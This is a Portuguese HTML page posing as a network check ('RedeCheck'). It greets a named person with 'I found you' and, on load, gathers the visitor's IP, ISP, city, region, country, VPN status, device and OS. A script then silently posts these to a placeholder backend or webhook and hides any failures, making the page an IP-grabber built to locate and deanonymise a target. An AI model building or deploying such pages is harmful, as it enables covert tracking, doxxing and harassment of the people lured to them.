<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RedeCheck – Beta</title>
    <style>
        :root {
            --primary: #6e45e2;
            --bg: #0b0b15;
            --card: rgba(25, 25, 40, .85);
            --text: #e0e0e0;
            --error: #f38ba8;
        }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            margin: 0;
            padding: 0;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .wrapper {
            background: var(--card);
            border-radius: 12px;
            padding: 40px;
            max-width: 600px;
            width: 94%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, .4);
            border: 1px solid var(--card);
        }
        .greeting {
            font-size: 32px;
            font-weight: bold;
            margin: 0;
            color: var(--primary);
        }
        .subtitle {
            margin: 8px 0 30px 0;
            font-size: 15px;
            opacity: .9;
        }
        .content-box {
            background: rgba(40, 40, 60, .7);
            border: 1px solid rgba(255, 255, 255, .08);
            border-radius: 8px;
            padding: 25px;
            margin-top: 25px;
            display: none;
        }
        .loading {
            text-align: center;
            margin: 30px auto 25px;
            display: none;
        }
        .spinner {
            border: 4px solid transparent;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 36px;
            height: 36px;
            margin: 0 auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .fields {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            text-align: left;
        }
        .field {
            padding: 8px 12px;
            background: rgba(60, 60, 80, .6);
            border-radius: 6px;
            font-size: 13px;
        }
        .label {
            font-weight: bold;
            color: var(--primary);
            display: block;
            margin-bottom: 3px;
        }
        .error {
            color: #fab387;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <span class="greeting">🔍 Te encontrei, Gabriel JTK</span>
        <p class="subtitle">Análise de conexão iniciando automaticamente...</p>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px; font-size: 13px;">Analisando sua conexão de rede...</p>
        </div>

        <div class="content-box" id="results">
            <h3 style="margin-top:0; color:var(--primary);">📌 Informações Capturadas</h3>
            <div class="fields">
                <div class="field"><span class="label">IP Real</span><span id="ip"></span></div>
                <div class="field"><span class="label">Provedor (ISP)</span><span id="isp"></span></div>
                <div class="field"><span class="label">VPN / Proxy</span><span id="vpn"></span></div>
                <div class="field"><span class="label">Cidade</span><span id="city"></span></div>
                <div class="field"><span class="label">Estado</span><span id="region"></span></div>
                <div class="field"><span class="label">País / Sigla</span><span id="country"></span></div>
                <div class="field"><span class="label">Tipo de Dispositivo</span><span id="deviceType"></span></div>
                <div class="field"><span class="label">Sistema Operacional</span><span id="os"></span></div>
            </div>
        </div>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            const loading = document.getElementById('loading');
            const results = document.getElementById('results');
            loading.style.display = 'block';

            async function fetchNetworkData() {
                try {
                    // Pega IP via API externa (2ip.io ou fallback)
                    let ip = 'Indisponível';
                    let locationData = {};

                    try {
                        const ipRes = await fetch('https://api.ipify.org?format=json', {mode:'no-cors'});
                        const ipJson = await ipRes.json();
                        ip = ipJson.ip;
                        console.log('IP capturado:', ip);
                    } catch(e) {
                        ip = 'Indisponível';
                    }

                    // Localização via ip-api (cidade, estado, país, ISP, VPN)
                    try {
                        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,country,countryCode,regionName,city,isp,proxy,hosting`);
                        locationData = await res.json();
                        console.log('IP-API:', locationData);
                    } catch(e2) {
                        console.error('IP-API failure', e2);
                        locationData = {
                            status: "fail", message: "API Unreachable",
                            city: "-", regionName: "-", country: "-", countryCode: "-", isp: "Indisponível", proxy: false, hosting: false
                        };
                    }

                    // Detecta dispositivo
                    const ua = navigator.userAgent || "";
                    const deviceType = /Mobile|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua) ? "Mobile" : "Desktop";
                    let os = "Windows";
                    if (/Mac|Macintosh|iMac|Mac OS X/i.test(ua)) os = "macOS";
                    else if (/Linux/i.test(ua)) os = "Linux";
                    else if (/Android/i.test(ua)) os = "Android";
                    else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";

                    // Define estilos pra VPN
                    const vpnEl = document.getElementById('vpn');
                    const isVpn = locationData.proxy || locationData.hosting;
                    vpnEl.textContent = isVpn ? "Sim (Detectado)" : "Não detectado";
                    vpnEl.style.color = isVpn ? "#fab387" : "#a6e3a1";

                    // Preenche tela com dados REAIS
                    document.getElementById('ip').textContent = ip;
                    document.getElementById('isp').textContent = locationData.isp || "-";
                    document.getElementById('city').textContent = locationData.city || "-";
                    document.getElementById('region').textContent = locationData.regionName || "-";
                    document.getElementById('country').textContent = `${locationData.country || "-"}/${locationData.countryCode || "-"}`;
                    document.getElementById('deviceType').textContent = deviceType;
                    document.getElementById('os').textContent = os;

                    // Esconde loading e mostra resultados
                    loading.style.display = 'none';
                    results.style.display = 'block';

                    // Envia pro seu backend (pode editar pra enviar pra webhook se quiser)
                    await postToBackend({
                        ip, isp: locationData.isp, city: locationData.city,
                        region: locationData.regionName, country: locationData.country,
                        vpn: isVpn ? "Sim" : "Não", deviceType, os
                    });

                } catch(e) {
                    console.error('[Network Fetch Error]:', e);
                    document.getElementById('loading').style.display = 'none';
                    results.innerHTML = `
                        <div class="error">⚠️ Não foi possível capturar seus dados. Tente novamente mais tarde.</div>
                        <div class="error" style="font-size:12px; margin-top:8px;">${e.message}</div>
                    `;
                    results.style.display = 'block';
                }
            }

            async function postToBackend(data) {
                // Envia pro seu servidor backend se tiver um
                // Aqui a gente envia pro seu servidor rodando no Netlify Function ou qualquer lugar
                // Substitua pela URL do seu back ou remova se não quiser.
                try {
                    await fetch('https://seu-backend.netlify.app/.netlify/functions/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                } catch(e) {
                    // Silent fail pra não interromper o usuário
                    console.log('[Backend send failed]:', e.message);
                }
            }

            // Assim que a página carrega, já começa a análise
            setTimeout(fetchNetworkData, 500);
        });
    </script>
</body>
</html>
